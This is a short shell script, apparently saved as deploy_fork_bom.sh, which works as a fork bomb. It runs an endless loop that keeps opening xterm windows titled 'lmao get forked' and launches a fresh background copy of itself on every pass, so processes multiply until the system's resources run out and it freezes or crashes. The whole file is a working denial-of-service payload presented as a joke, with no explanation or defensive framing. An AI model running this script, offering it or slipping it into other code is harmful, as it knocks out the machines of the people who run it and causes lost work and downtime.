#!/bin/sh

bom(){
	xterm -hold -title 'lmao get forked' -mesg -geometry 126x71 -e cat fork
}

deploy(){	
	while :
		do 
			bom
			./deploy_fork_bom.sh &
		done
}

deploy
